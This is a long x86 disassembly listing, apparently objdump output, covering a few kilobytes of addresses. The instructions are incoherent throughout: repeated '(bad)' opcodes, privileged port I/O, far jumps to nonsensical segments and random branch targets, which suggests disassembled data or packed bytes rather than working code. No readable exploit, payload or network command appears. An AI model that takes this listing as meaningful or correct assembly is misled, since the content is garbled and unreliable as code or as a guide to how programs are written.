  422fff:	mov    ebp,0xe0e4c0e9
  423004:	rcr    dh,1
  423006:	fcmovne st,st(5)
  423008:	out    dx,al
  423009:	sar    ebp,cl
  42300b:	clc    
  42300c:	int    0xc7
  42300e:	repnz in al,dx
  423010:	les    edi,FWORD PTR [edx+ecx*1+0xbcfe7d6]
  423017:	bswap  ebp
  423019:	loop   0x42300c
  42301b:	ror    ebp,1
  42301d:	repz lock jmp 0xf1ce:0xcdb5ebd3
  423026:	cli    
  423027:	fdivr  st,st(1)
  423029:	loop   0x422ffb
  42302b:	stc    
  42302c:	pop    es
  42302d:	add    dh,cl
  42302f:	sti    
  423030:	xlat   BYTE PTR ds:[ebx]
  423031:	or     dh,ch
  423033:	std    
  423034:	jecxz  0x423030
  423036:	out    dx,eax
  423037:	ffree  st(6)
  423039:	jmp    0xeec8:0xf6b8f105
  423040:	lods   al,BYTE PTR ds:[esi]
  423041:	retf   0xb2a8
  423044:	hlt    
  423045:	rcr    bh,1
  423047:	aad    0xe8
  423049:	lock fucomip st,st(7)
  42304c:	loope  0x42300f
  42304e:	fcmovb st,st(0)
  423050:	loop   0x423024
  423052:	loop   0x423015
  423054:	call   0xf9382b61
  423059:	stc    
  42305a:	loop   0x423027
  42305c:	rol    al,0xc6
  42305f:	out    0xc9,eax
  423061:	shl    BYTE PTR [eax-0x2043f0b],1
  423067:	call   0xfff069
  42306c:	lock fucom st(6)
  42306f:	fld    DWORD PTR [ecx+edx*8]
  423072:	jecxz  0x423077
  423074:	fmul   st,st(2)
  423076:	pop    es
  423077:	ret    
  423078:	jmp    0xbd243a79
  42307d:	out    0xe7,al
  42307f:	lock loopne 0x423033
  423082:	mov    dh,0xd6
  423084:	leave  
  423085:	repz (bad) 
  423087:	mov    ebp,0x2d6dfd4
  42308c:	jecxz  0x423086
  42308e:	in     al,dx
  42308f:	push   es
  423090:	mul    ah
  423092:	rcr    edx,1
  423094:	(bad)
  423097:	loopne 0x4230a2
  423099:	fdivr  st,st(2)
  42309b:	enter  0xd3cc,0xd5
  42309f:	lods   al,BYTE PTR ds:[esi]
  4230a0:	into   
  4230a1:	retf   0xcbc5
  4230a4:	mov    al,0xf0
  4230a6:	mov    dh,0xdc
  4230a8:	sar    dl,1
  4230aa:	int3   
  4230ab:	shr    esp,1
  4230ad:	aam    0xf2
  4230af:	mov    ebp,0x1f1c0f3
  4230b4:	(bad)  
  4230b5:	dec    DWORD PTR ds:0xd8fdcbfd
  4230bb:	ror    dh,0xd1
  4230be:	shl    ah,1
  4230c0:	lods   al,BYTE PTR ds:[esi]
  4230c1:	repnz into 
  4230c3:	retf   0xf5cc
  4230c6:	repz leave 
  4230c8:	in     eax,dx
  4230c9:	stc    
  4230ca:	cld    
  4230cb:	clc    
  4230cc:	jecxz  0x42309d
  4230ce:	icebp  
  4230cf:	int3   
  4230d0:	or     ebx,ebp
  4230d2:	add    eax,0xe9070a05
  4230d7:	std    
  4230d8:	or     ecx,DWORD PTR ds:0xf2ece9c4
  4230de:	shr    BYTE PTR [esi-0x124d3d0d],0xd1
  4230e5:	stc    
  4230e6:	out    dx,eax
  4230e7:	mov    ch,0xc8
  4230e9:	stc    
  4230ea:	out    dx,al
  4230eb:	mov    edi,0xf0f7c1be
  4230f0:	jecxz  0x4230ab
  4230f2:	inc    DWORD PTR [ebx]
  4230f4:	fldl2t 
  4230f6:	out    dx,al
  4230f7:	enter  0xebeb,0xd8
  4230fb:	vpsubsb ymm3,ymm6,ymm6
  4230ff:	retf   
  423100:	rcl    dl,cl
  423102:	iret   
  423103:	not    esp
  423105:	retf   0xc8f9
  423108:	(bad)  
  423109:	icebp  
  42310a:	mov    esi,0x1f9dded
  42310f:	lock cld 
  423111:	out    0xd9,al
  423113:	or     dh,bh
  423115:	add    al,0xfb
  423117:	loop   0x423117
  423119:	fucomi st,st(4)
  42311b:	int    0xb0
  42311d:	test   al,0xc6
  42311f:	leave  
  423120:	repz out dx,eax
  423122:	loopne 0x4230f9
  423124:	aam    0xcb
  423126:	shl    ecx,1
  423128:	retf   0xdcf0
  42312b:	xlat   BYTE PTR ds:[ebx]
  42312c:	aam    0x0
  42312e:	ret    0xfd06
  423131:	add    eax,0xcff50be0
  423136:	enter  0xcddd,0xc5
  42313a:	shl    BYTE PTR [edi-0x1638532e],cl
  423140:	shl    DWORD PTR [ebp-0x39162f10],0xe9
  423147:	aam    0xd3
  423149:	iret   
  42314a:	cli    
  42314b:	ret    0xf8d1
  42314e:	(bad)  
  423150:	aad    0xc0
  423152:	add    al,0xe2
  423154:	sti    
  423155:	loopne 0x42314d
  423157:	fld    DWORD PTR [eax]
  423159:	in     eax,0xda
  42315b:	in     al,dx
  42315c:	vcmppd ymm2,ymm7,ymm7,0xcf
  423161:	mov    al,0xc0
  423163:	(bad)  
  423164:	test   bl,0xfa
  423167:	in     eax,dx
  423168:	(bad)  
  423169:	repz mov esp,0xdcc0dcce
  42316f:	in     eax,dx
  423170:	(bad)  
  423171:	jecxz  0x423150
  423173:	loope  0x42316d
  423175:	cli    
  423176:	dec    DWORD PTR [edx]
  423178:	aam    0xef
  42317a:	clc    
  42317b:	mov    cl,0xea
  42317d:	loopne 0x423150
  42317f:	retf   
  423180:	mov    dh,0xd2
  423182:	call   0xba272355
  423187:	repnz (bad) 
  42318a:	iret   
  42318b:	mov    ebx,0x5c6dddb
  423190:	std    
  423191:	stc    
  423192:	shl    ah,cl
  423194:	add    edx,esi
  423196:	(bad)  
  423197:	(bad)  
  423199:	push   cs
  42319a:	or     al,bh
  42319c:	loope  0x423169
  42319e:	(bad)  
  42319f:	shl    al,1
  4231a1:	mov    dh,0xc9
  4231a3:	mov    ah,0xe7
  4231a5:	int    0xb4
  4231a7:	icebp  
  4231a8:	jmp    0x12b35a1
  4231ad:	add    al,bh
  4231af:	sti    
  4231b0:	add    al,0xd0
  4231b2:	hlt    
  4231b3:	lock loop 0x4231a4
  4231b6:	enter  0xe20a,0xa
  4231ba:	push   cs
  4231bb:	mov    esp,0xc1f1c8cb
  4231c0:	in     al,0xc8
  4231c2:	in     al,0xd0
  4231c4:	retf   0xceee
  4231c7:	jmp    0xd8bf:0xf8bfcaf6
  4231ce:	icebp  
  4231cf:	in     eax,0xe7
  4231d1:	add    al,0xf0
  4231d3:	pop    es
  4231d4:	loop   0x4231b0
  4231d6:	loopne 0x4231d0
  4231d8:	in     eax,dx
  4231d9:	or     cl,cl
  4231db:	mov    ecx,0xe5e0c7aa
  4231e0:	test   esi,0xf5c7cbdb
  4231e6:	int    0xf5
  4231e8:	(bad)  
  4231e9:	shl    eax,1
  4231eb:	sti    
  4231ec:	iret   
  4231ed:	(bad)  
  4231ee:	repnz (bad) 
  4231f1:	add    al,dh
  4231f3:	fincstp 
  4231f5:	fadd   QWORD PTR [esi]
  4231f7:	ret    
  4231f8:	loopne 0x4231fb
  4231fa:	or     eax,0xcff1d8c8
  4231ff:	icebp  
  423200:	int3   
  423201:	mov    cl,0xcc
  423203:	rcr    bh,0xe6
  423206:	jmp    0x42febe0
  42320b:	call   0xf63b32e8
  423210:	test   BYTE PTR [edi],0xe4
  423213:	call   0xb4bf2f7
  423218:	in     eax,0xee
  42321a:	push   cs
  42321b:	(bad)
  42321e:	aad    0xf7
  423220:	loope  0x42320d
  423222:	retf   
  423223:	(bad)  
  423224:	enter  0xecd6,0xe8
  423228:	sti    
  423229:	loop   0x42321e
  42322b:	(bad)  
  42322d:	cld    
  42322e:	cli    
  42322f:	neg    eax
  423231:	rol    DWORD PTR [edi],0xc6
  423234:	cli    
  423235:	loopne 0x42323c
  423237:	fmul   DWORD PTR [eax]
  423239:	or     al,ch
  42323b:	rol    esi,1
  42323d:	mov    bh,0xb0
  42323f:	loopne 0x42322d
  423241:	(bad)  
  423242:	(bad)  
  423243:	hlt    
  423244:	mov    edx,0xe8edfbd4
  423249:	leave  
  42324a:	mov    ebp,0xd3dce3cd
  42324f:	add    ebx,edi
  423251:	cli    
  423252:	(bad)  
  423253:	hlt    
  423254:	lock in al,0xd9
  423257:	out    0xc6,eax
  423259:	or     dh,cl
  42325b:	fxch   st(0)
  42325d:	mov    edi,0xe5c7c9a8
  423262:	jmp    0xb2dd:0xcce9faef
  423269:	ret    
  42326a:	loop   0x423225
  42326c:	(bad)  
  42326d:	(bad)  
  42326e:	mov    edi,0xbe400f1
  423273:	idiv   al
  423275:	add    al,ah
  423277:	fmulp  st(7),st
  423279:	vpmulhuw ymm6,ymm0,YMMWORD PTR [eax-0x2f324e2d]
  423281:	rol    bh,1
  423283:	mov    ebx,0xbafdb8c8
  423288:	shr    esi,1
  42328a:	in     eax,dx
  42328b:	ror    esp,0xff
  42328e:	(bad)  
  42328f:	repz ffreep st(2)
  423292:	in     al,0xf4
  423294:	add    BYTE PTR [edi],cl
  423296:	fsubp  st(4),st
  423298:	add    al,ch
  42329a:	shl    cl,0xd2
  42329d:	enter  0xe6c4,0xbc
  4232a1:	int3   
  4232a2:	out    dx,eax
  4232a3:	jmp    0xde37e368
  4232a8:	(bad)  
  4232a9:	mov    ecx,0xf1f4e0fa
  4232ae:	icebp  
  4232af:	xlat   BYTE PTR ds:[ebx]
  4232b0:	out    0xfe,al
  4232b2:	or     eax,DWORD PTR [ebx]
  4232b4:	lds    eax,FWORD PTR [edi]
  4232b6:	push   es
  4232b7:	or     eax,esp
  4232b9:	jmp    0xef24f4bd
  4232be:	aad    0xcb
  4232c0:	iret   
  4232c1:	cmc    
  4232c2:	mov    edx,0xb5f7d0e0
  4232c7:	(bad)  
  4232c9:	fdivr  st(4),st
  4232cb:	ret    
  4232cc:	clc    
  4232cd:	(bad)  
  4232ce:	aad    0xfb
  4232d0:	rcr    ch,cl
  4232d2:	loop   0x4232c4
  4232d4:	or     al,BYTE PTR [edi+eax*8]
  4232d7:	in     eax,0xc9
  4232d9:	add    eax,0xc1e1d20a
  4232de:	enter  0xeee8,0xf0
  4232e2:	int3   
  4232e3:	mul    bh
  4232e5:	(bad)  
  4232e7:	icebp  
  4232e8:	ror    ah,1
  4232ea:	shl    BYTE PTR [edi-0x391f3f0d],1
  4232f0:	(bad)  
  4232f1:	stc    
  4232f2:	jmp    0x4232f9
  4232f4:	in     eax,0xdb
  4232f6:	retf   
  4232f7:	push   cs
  4232f8:	push   es
  4232f9:	add    cl,al
  4232fb:	repz out dx,eax
  4232fd:	test   eax,0xb2f2d2ef
  423302:	shl    DWORD PTR [ebp-0x333a313b],cl
  423308:	mov    edx,0xf7f8d4d8
  42330d:	repz fsubrp st(7),st
  423310:	(bad)
  423313:	xlat   BYTE PTR ds:[ebx]
  423314:	add    BYTE PTR [edi],cl
  423316:	fiadd  WORD PTR [edi+edi*8]
  423319:	in     eax,0xee
  42331b:	mov    esp,0xf7c4f7ef
  423320:	mov    ch,0xfa
  423322:	jmp    0x4232ee
  423324:	fsubr  st,st(3)
  423326:	(bad)  
  423328:	mov    ch,0xbe
  42332a:	(bad)  
  42332c:	in     eax,dx
  42332d:	fidivr WORD PTR [ebp-0xff82903]
  423333:	(bad)  
  423334:	lock cld 
  423336:	fucom  st(6)
  423338:	out    0xeb,eax
  42333a:	add    al,0xde
  42333c:	in     al,0xc0
  42333e:	enter  0xeadd,0xb1
  423342:	mov    ah,0xf5
  423344:	fldln2 
  423346:	hlt    
  423347:	sar    DWORD PTR [esi-0x2423460c],cl
  42334d:	xlat   BYTE PTR ds:[ebx]
  42334e:	mov    BYTE PTR [ebx],0xd9
  423351:	or     edi,eax
  423353:	add    dl,ah
  423355:	jmp    0x42332d
  423357:	retf   
  423358:	retf   0xeacc
  42335b:	repz call 0xf82af454
  423361:	mov    bh,0xb0
  423363:	sar    BYTE PTR [eax-0x32481310],1
  423369:	fidivr DWORD PTR [ebx-0xd3f0d3d]
  42336f:	fcmove st,st(4)
  423371:	add    eax,0x9fdd9e9
  423376:	stc    
  423377:	jmp    0xe8e0:0xadece3da
  42337e:	retf   
  42337f:	aam    0xe1
  423381:	mov    bl,0xb3
  423383:	mov    ecx,0xdcbef2d2
  423388:	fstp   TBYTE PTR [eax+0x601c8bf]
  42338e:	int3   
  42338f:	rol    DWORD PTR [edx],1
  423391:	in     al,0xea
  423393:	jmp    0xea2bfba0
  423398:	int    0x2
  42339a:	rcr    ch,0xf0
  42339d:	mov    al,0xde
  42339f:	loop   0x423382
  4233a1:	test   eax,0xadf2b9b5
  4233a6:	mov    edi,0xc2c3ced1
  4233ab:	loopne 0x423380
  4233ad:	clc    
  4233ae:	add    bh,ch
  4233b0:	rcr    ah,cl
  4233b2:	or     edx,edi
  4233b4:	(bad)
  4233b7:	loopne 0x4233b4
  4233b9:	(bad)  
  4233bb:	fsubr  st,st(2)
  4233bd:	in     al,0xd1
  4233bf:	out    dx,al
  4233c0:	in     eax,0xed
  4233c2:	mov    cl,0xd4
  4233c4:	mov    edx,0x3d6d6f2
  4233c9:	shl    esp,cl
  4233cb:	add    dh,BYTE PTR [esi-0x3c0c06f9]
  4233d1:	(bad)  
  4233d2:	fcmovbe st,st(0)
  4233d4:	enter  0xeed4,0xfc
  4233d8:	or     DWORD PTR [ebx],eax
  4233da:	loopne 0x4233b5
  4233dc:	fadd   st(4),st
  4233de:	mov    esp,0xe4cff3e6
  4233e3:	(bad)  
  4233e4:	out    0xeb,eax
  4233e6:	int3   
  4233e7:	jmp    0xd7fe26e6
  4233ec:	cli    
  4233ed:	cld    
  4233ee:	xlat   BYTE PTR ds:[ebx]
  4233ef:	shl    ch,cl
  4233f1:	fild   WORD PTR [edi]
  4233f3:	retf   0xfbeb
  4233f6:	fcmovbe st,st(4)
  4233f8:	(bad)  
  4233f9:	(bad)  
  4233fb:	retf   0xbee2
  4233fe:	div    dh
  423400:	cmc    
  423401:	div    ah
  423403:	mov    cl,0xae
  423405:	repnz mov dh,0xe9
  423408:	out    dx,eax
  423409:	sar    eax,cl
  42340b:	aam    0xee
  42340d:	cld    
  42340e:	out    0xe6,al
  423410:	sti    
  423411:	mov    BYTE PTR [eax],0x2
  423414:	out    dx,eax
  423415:	lds    eax,FWORD PTR [ebx]
  423417:	fisttp WORD PTR [edx]
  423419:	(bad)  
  42341b:	(bad)  
  42341d:	test   ebx,0xf9c7d1f4
  423423:	out    0xec,eax
  423425:	mov    eax,0xebd8fbc4
  42342a:	mov    ecx,0xfcdf01ff
  42342f:	(bad)  
  423430:	fcomi  st,st(1)
  423432:	(bad)  
  423433:	call   0xed220d1b
  423438:	push   es
  423439:	or     BYTE PTR [ecx],cl
  42343b:	out    dx,al
  42343c:	jmp    0xce040318
  423441:	iret   
  423442:	(bad)
  423445:	jmp    0xdfce:0xfce4f3f7
  42344c:	fsubr  st(3),st
  42344e:	fsubrp st(1),st
  423450:	mov    esp,0xf5c4e6e7
  423455:	add    bh,bl
  423457:	retf   
  423458:	out    0xd,eax
  42345a:	in     al,dx
  42345b:	jecxz  0x423447
  42345d:	repz out dx,eax
  42345f:	fdiv   QWORD PTR [eax-0x14310f38]
  423465:	mov    ebx,0xbbf0e5d8
  42346a:	fcos   
  42346c:	repz mov ecx,0xf6f7cd01
  423472:	add    ebp,ebx
  423474:	or     DWORD PTR [ebx],eax
  423476:	in     eax,dx
  423477:	add    ecx,ebp
  423479:	out    dx,al
  42347a:	(bad)  
  42347b:	in     al,dx
  42347c:	les    ebp,FWORD PTR [eax-0x2e4e1636]
  423482:	sti    
  423483:	mov    dh,0xea
  423485:	enter  0xdeef,0xba
  423489:	aad    0xe9
  42348b:	aam    0xcf
  42348d:	sar    DWORD PTR [eax-0x3bf53a14],cl
  423493:	in     al,0xfd
  423495:	sti    
  423496:	pop    es
  423497:	add    edi,ebp
  423499:	add    cl,BYTE PTR [esi]
  42349b:	stos   BYTE PTR es:[edi],al
  42349c:	fsubp  st(3),st
  42349e:	(bad)  
  4234a0:	in     eax,0xb1
  4234a2:	jmp    0x423456
  4234a4:	mov    ah,0xf9
  4234a6:	mov    ecx,0xfdb1edd5
  4234ab:	loope  0x42346a
  4234ad:	sti    
  4234ae:	clc    
  4234af:	fprem1 
  4234b1:	add    ebx,ebx
  4234b3:	div    eax
  4234b5:	(bad)  
  4234b6:	std    
  4234b7:	fsub   st(3),st
  4234b9:	or     bh,ch
  4234bb:	ret    
  4234bc:	repz mov bh,0xe0
  4234bf:	ror    eax,cl
  4234c1:	repnz mov bh,0xd8
  4234c4:	hlt    
  4234c5:	fstp   TBYTE PTR [edi-0xc0d0e10]
  4234cb:	add    eax,ebx
  4234cd:	in     al,dx
  4234ce:	into   
  4234cf:	add    ebx,esp
  4234d1:	fcmovnu st,st(7)
  4234d3:	or     esp,esi
  4234d5:	cld    
  4234d6:	pop    es
  4234d7:	or     bh,cl
  4234d9:	jecxz  0x4234b9
  4234db:	(bad)  
  4234dc:	int3   
  4234dd:	(bad)  
  4234de:	jmp    0x42348c
  4234e0:	loope  0x4234d4
  4234e2:	ror    dh,cl
  4234e4:	sti    
  4234e5:	jmp    0x4234a1
  4234e7:	mov    dh,0xbc
  4234e9:	repz mov ah,0xfa
  4234ec:	(bad)  
  4234ee:	jecxz  0x4234b6
  4234f0:	rol    al,1
  4234f2:	aam    0xc0
  4234f4:	fdivr  QWORD PTR [ebp-0x22191002]
  4234fa:	jmp    0xe90927ef
  4234ff:	shl    ebp,0xe6
  423502:	retf   
  423503:	mov    bl,0xc4
  423505:	iret   
  423506:	out    0xd5,al
  423508:	int3   
  423509:	rol    dl,cl
  42350b:	cli    
  42350c:	repz fst st(7)
  42350f:	(bad)  
  423510:	rcl    cl,cl
  423512:	neg    ecx
  423514:	add    eax,0xd9def8e0
  423519:	loop   0x423506
  42351b:	mov    bl,0xbe
  42351d:	shl    BYTE PTR [ecx-0xb094f3a],0xb0
  423524:	(bad)
  423527:	call   0xce1e2cfd
  42352c:	mov    esp,0xfdfae1e6
  423531:	ret    
  423532:	jmp    0xd038f82b
  423537:	add    ebx,edi
  423539:	repz add al,al
  42353c:	mov    ebp,0xf7eccdc8
  423541:	hlt    
  423542:	lock (bad) 
  423545:	fdivr  st,st(1)
  423547:	retf   
  423548:	mov    dl,0xde
  42354a:	mov    ebp,0x101d6cd
  42354f:	(bad)  
  423550:	xlat   BYTE PTR ds:[ebx]
  423551:	ror    DWORD PTR [ecx],cl
  423553:	pop    es
  423554:	clc    
  423555:	jmp    0x42352f
  423557:	cmc    
  423558:	(bad)
  42355b:	mov    eax,0xf6ebc6c8
  423560:	mov    cl,0xf2
  423562:	lock mov dh,0xce
  423565:	mov    edi,0xf6f0cdeb
  42356a:	int    0xc2
  42356c:	enter  0x7b5,0xc7
  423570:	(bad)  
  423571:	or     edi,edx
  423573:	jmp    0xca293168
  423578:	iret   
  423579:	or     ch,bh
  42357b:	icebp  
  42357c:	mov    esp,0xccf2f0f2
  423581:	(bad)  
  423582:	lock lds esi,FWORD PTR [ebp-0x304c044c]
  423589:	loop   0x42355e
  42358b:	sti    
  42358c:	add    edi,edi
  42358e:	inc    BYTE PTR ds:0xcac6fbd5
  423594:	fcomp  st(0)
  423596:	add    ah,bl
  423598:	add    ecx,ebx
  42359a:	out    0xce,eax
  42359c:	mov    esi,0xede8f5d0
  4235a1:	jecxz  0x423599
  4235a3:	into   
  4235a4:	(bad)  
  4235a5:	aam    0xd0
  4235a7:	mov    eax,0xd9b4d1f7
  4235ac:	int    0xf5
  4235ae:	clc    
  4235af:	fiadd  DWORD PTR ds:0xc2d0e7f7
  4235b5:	ror    BYTE PTR [edx],0xfc
  4235b8:	hlt    
  4235b9:	jmp    0xeb2a1ea5
  4235be:	in     al,0xed
  4235c0:	cmc    
  4235c1:	repnz cli 
  4235c3:	mov    edx,0xd3d5f0f7
  4235c8:	retf   
  4235c9:	fdivr  st(6),st
  4235cb:	int    0x0
  4235cd:	in     al,dx
  4235ce:	in     eax,dx
  4235cf:	(bad)  
  4235d0:	cli    
  4235d1:	out    0xb,al
  4235d3:	jmp    0xeb11f3c8
  4235d8:	or     bh,dl
  4235da:	out    dx,al
  4235db:	lods   al,BYTE PTR ds:[esi]
  4235dc:	(bad)  
  4235dd:	enter  0xe5dd,0xd6
  4235e1:	jmp    0x4235b8
  4235e3:	stc    
  4235e4:	sti    
  4235e5:	jmp    0x4235e1
  4235e7:	into   
  4235e8:	mov    esp,0x1f5fbee
  4235ed:	hlt    
  4235ee:	add    eax,0xc604d0c7
  4235f3:	jecxz  0x4235f8
  4235f5:	fdivp  st(2),st
  4235f7:	(bad)  
  4235f8:	stc    
  4235f9:	psrlq  mm2,mm3
  4235fc:	fadd   st,st(0)
  4235fe:	loop   0x4235e8
  423600:	stos   BYTE PTR es:[edi],al
  423601:	in     eax,0xc2
  423603:	jmp    0xe9fde6da
  423608:	mov    ebx,0xfec3f3f9
  42360d:	mov    esp,0xc0f9fac1
  423612:	or     eax,DWORD PTR [ebx]
  423614:	jmp    0x4235ff
  423616:	jmp    ebx
  423618:	(bad)  
  42361a:	into   
  42361b:	fsub   st(1),st
  42361d:	(bad)  
  42361f:	shl    ch,1
  423621:	mov    al,0xb4
  423623:	mov    edx,0xd1e8ebce
  423628:	jmp    0xc32b2a03
  42362d:	rol    eax,cl
  42362f:	repnz mov edx,0xe3e20ad1
  423635:	fld    QWORD PTR ds:0xde0fc5ce
  42363b:	mov    ecx,0xd1eedfe4
  423640:	enter  0xb5e9,0xfa
  423644:	out    0xcd,eax
  423646:	jmp    0x42361d
  423648:	(bad)  
  42364a:	aam    0xd1
  42364c:	(bad)  
  42364d:	mov    ecx,0xdbe6f9e2
  423652:	(bad)  
  423653:	add    bl,bl
  423655:	in     al,0xdf
  423657:	in     al,dx
  423658:	fxam   
  42365a:	or     al,0xe7
  42365c:	enter  0xc1f1,0xcf
  423660:	rol    ah,0xcb
  423663:	mov    bh,0xd5
  423665:	shl    dh,1
  423667:	(bad)  
  423669:	mov    ebp,0xbeedb8bf
  42366e:	stc    
  42366f:	in     al,dx
  423670:	(bad)  
  423671:	fsubrp st(4),st
  423673:	jmp    0x423675
  423675:	fsub   st(3),st
  423677:	add    ah,ch
  423679:	add    al,0xc4
  42367b:	retf   
  42367c:	retf   
  42367d:	in     al,0xec
  42367f:	out    dx,eax
  423680:	out    0xc4,al
  423682:	lods   al,BYTE PTR ds:[esi]
  423683:	mov    dh,0xf7
  423685:	fdivr  st,st(7)
  423687:	icebp  
  423688:	sar    BYTE PTR [edx-0x3e403c2a],1
  42368e:	mov    ah,0x2
  423690:	add    eax,0xdaf1dedb
  423695:	fmul   st,st(1)
  423697:	fisttp WORD PTR [edi]
  423699:	repz icebp 
  42369b:	in     eax,dx
  42369c:	jmp    0xe6e3:0xfbedd7c4
  4236a3:	mov    bl,0xfb
  4236a5:	mov    bh,0xd1
  4236a7:	mov    ecx,0xfbdbccfd
  4236ac:	(bad)  
  4236ae:	std    
  4236af:	mov    ebx,0x5c10304
  4236b4:	loope  0x4236b2
  4236b6:	(bad)  
  4236b7:	aam    0xe0
  4236b9:	or     al,0xda
  4236bb:	into   
  4236bc:	ffreep st(0)
  4236be:	(bad)
  4236c1:	lock shr dh,0xb1
  4236c5:	out    dx,al
  4236c6:	std    
  4236c7:	clc    
  4236c8:	shl    edx,1
  4236ca:	mov    esi,0xf1c2efde
  4236cf:	shl    cl,1
  4236d1:	les    eax,FWORD PTR [ebx]
  4236d3:	leave  
  4236d4:	fucomi st,st(2)
  4236d6:	fcmovne st,st(6)
  4236d8:	jmp    0x4236e2
  4236da:	icebp  
  4236db:	mov    ecx,0xdcc7c0a9
  4236e0:	mov    cl,0xc5
  4236e2:	in     eax,0xef
  4236e4:	repnz out dx,eax
  4236e6:	mov    edi,0xfff5b6f7
  4236eb:	jecxz  0x4236ee
  4236ed:	rcl    al,0xec
  4236f0:	int3   
  4236f1:	(bad)  
  4236f2:	ret    0xc604
  4236f5:	mov    ebp,0xaece2e4
  4236fa:	jmp    0x4236e2
  4236fc:	int    0xee
  4236fe:	leave  
  4236ff:	mov    ebp,0xd2baf0db
  423704:	mov    ebx,0xc9b7decc
  423709:	shl    BYTE PTR [eax-0x39240111],cl
  42370f:	cmc    
  423710:	(bad)
  423713:	rcr    al,1
  423715:	fadd   DWORD PTR [ecx+ebp*8]
  423718:	aam    0x8
  42371a:	jecxz  0x4236c4
  42371c:	shl    BYTE PTR [ebx-0x3316113a],cl
  423722:	loop   0x423718
  423724:	stc    
  423725:	push   ebp
  423727:	mov    ecx,0xd8d3d0b9
  42372c:	call   0xf7332d30
  423731:	div    ah
  423733:	fcmovnbe st,st(4)
  423735:	retf   
  423736:	(bad)  
  423738:	out    0xe3,eax
  42373a:	iret   
  42373b:	(bad)  
  42373c:	mov    edi,0xdcddd0f7
  423741:	jecxz  0x423739
  423743:	enter  0xeed2,0xfa
  423747:	sar    dl,cl
  423749:	cmc    
  42374a:	call   0xb91c3a4b
  42374f:	loopne 0x423749
  423751:	loopne 0x423734
  423753:	les    eax,FWORD PTR [eax]
  423755:	add    ch,dl
  423757:	(bad)  
  423759:	adc    eax,DWORD PTR [ecx]
  42375b:	mov    edi,0xadedc0d2
  423760:	mov    ah,0xc7
  423762:	shl    esi,1
  423764:	(bad)  
  423765:	retf   0xf3d2
  423768:	icebp  
  423769:	sar    DWORD PTR [edx+edx*8+0x3f3f5fe],cl
  423770:	shl    bl,0x6
  423773:	shl    bl,1
  423775:	add    edi,ecx
  423777:	cli    
  423778:	add    al,0xdd
  42377a:	fistp  QWORD PTR [edi-0x431d1310]
  423780:	repz icebp 
  423782:	int3   
  423783:	enter  0xc4c8,0xe5
  423787:	cld    
  423788:	sti    
  423789:	fld    DWORD PTR [edx]
  42378b:	xlat   BYTE PTR ds:[ebx]
  42378c:	div    esi
  42378e:	cld    
  42378f:	in     al,dx
  423790:	ret    
  423791:	retf   
  423792:	fcomi  st,st(1)
  423794:	or     ecx,DWORD PTR [esi]
  423796:	add    dh,ch
  423798:	fdivp  st(3),st
  42379a:	(bad)  
  42379b:	shr    ebx,1
  42379d:	mov    dl,0xad
  42379f:	call   0xc623038e
  4237a4:	jmp    0x42376b
  4237a6:	shl    dl,1
  4237a8:	sar    DWORD PTR [ecx+0x3ddcced],cl
  4237ae:	hlt    
  4237af:	mov    ebp,0xe3fefbf9
  4237b4:	mov    esp,0xcae60fc6
  4237ba:	rep stos DWORD PTR es:[edi],eax
  4237bc:	lods   eax,DWORD PTR ds:[esi]
  4237bd:	leave  
  4237be:	shl    bh,0xcb
  4237c1:	imul   DWORD PTR [eax-0x51b3f49]
  4237c7:	(bad)  
  4237c8:	fst    st(3)
  4237ca:	cld    
  4237cb:	add    edx,edx
  4237cd:	mov    ecx,0xc40705fe
  4237d2:	(bad)  
  4237d4:	jmp    0xece1:0xdf4f5c6
  4237db:	in     al,dx
  4237dc:	int    0xb7
  4237de:	cmc    
  4237df:	ret    
  4237e0:	leave  
  4237e1:	mov    dh,0xf0
  4237e3:	fsqrt  
  4237e5:	fcmovnu st,st(1)
  4237e7:	aam    0xbb
  4237e9:	(bad)  
  4237ea:	mov    eax,0xd5d3dcda
  4237ef:	fiadd  WORD PTR [edx]
  4237f1:	out    0xfa,eax
  4237f3:	or     bh,bl
  4237f5:	imul   eax
  4237f7:	retf   0xfbdf
  4237fa:	cli    
  4237fb:	loopne 0x4237af
  4237fd:	out    dx,eax
  4237fe:	in     eax,0xcc
  423800:	mov    al,0xa9
  423802:	leave  
  423803:	jmp    0xdbfc26fc
  423808:	mov    ebp,0xd5d3d0eb
  42380d:	shl    bl,cl
  42380f:	in     eax,dx
  423810:	out    0xd6,eax
  423812:	ror    BYTE PTR [ecx],1
  423814:	call   ebp
  423816:	(bad)  
  423817:	leave  
  423818:	add    eax,DWORD PTR [ebx]
  42381a:	jmp    esp
  42381c:	loope  0x4237fa
  42381e:	rol    edx,cl
  423820:	shl    dh,0xf2
  423823:	out    0xf3,eax
  423825:	fmulp  st(7),st
  423827:	mov    ebx,0xfed0b8be
  42382c:	add    bh,bl
  42382e:	in     eax,0xed
  423830:	jmp    0x423811
  423832:	in     eax,0xd8
  423834:	add    edx,edi
  423836:	jmp    0x34d4823
  42383b:	mov    cl,0xc0
  42383d:	(bad)  
  42383f:	repnz icebp 
  423841:	aad    0xb3
  423843:	ror    ch,cl
  423845:	cli    
  423846:	out    dx,al
  423847:	rcl    ebp,1
  423849:	mov    esi,0xcecdf0f3
  42384e:	ret    
  42384f:	add    al,0x0
  423851:	or     dl,cl
  423853:	loope  0x423845
  423855:	std    
  423856:	out    dx,al
  423857:	or     cl,BYTE PTR ds:0xd7d3d8d8
  42385d:	lds    ebp,FWORD PTR [edi-0xc115140]
  423863:	rcl    ah,cl
  423865:	xlat   BYTE PTR ds:[ebx]
  423866:	mov    edi,0xd7ffd8f2
  42386b:	cld    
  42386c:	pop    es
  42386d:	mov    esi,0xdce4f5e1
  423872:	jmp    0xe40a4855
  423877:	fdivr  st,st(3)
  423879:	out    dx,al
  42387a:	push   cs
  42387b:	mov    eax,0xf3e8e1c7
  423880:	repz loop 0x423863
  423883:	out    dx,al
  423884:	fidiv  DWORD PTR [eax-0x14242c13]
  42388a:	icebp  
  42388b:	in     eax,dx
  42388c:	fcmovu st,st(2)
  42388e:	rcr    cl,1
  423890:	loop   0x42386b
  423892:	add    al,0xf4
  423894:	out    0xcf,eax
  423896:	call   0xda1e3762
  42389b:	out    0xc4,eax
  42389d:	mov    dl,0xf1
  42389f:	mov    dh,0xc0
  4238a1:	aad    0xec
  4238a3:	ror    cl,1
  4238a5:	out    0xec,eax
  4238a7:	out    dx,al
  4238a8:	jmp    0xedbc:0xfae8f8ff
  4238af:	shl    ecx,1
  4238b1:	add    bl,bl
  4238b3:	hlt    
  4238b4:	out    0xc1,eax
  4238b6:	push   es
  4238b7:	out    0xc,eax
  4238b9:	fdivrp st(1),st
  4238bb:	out    dx,eax
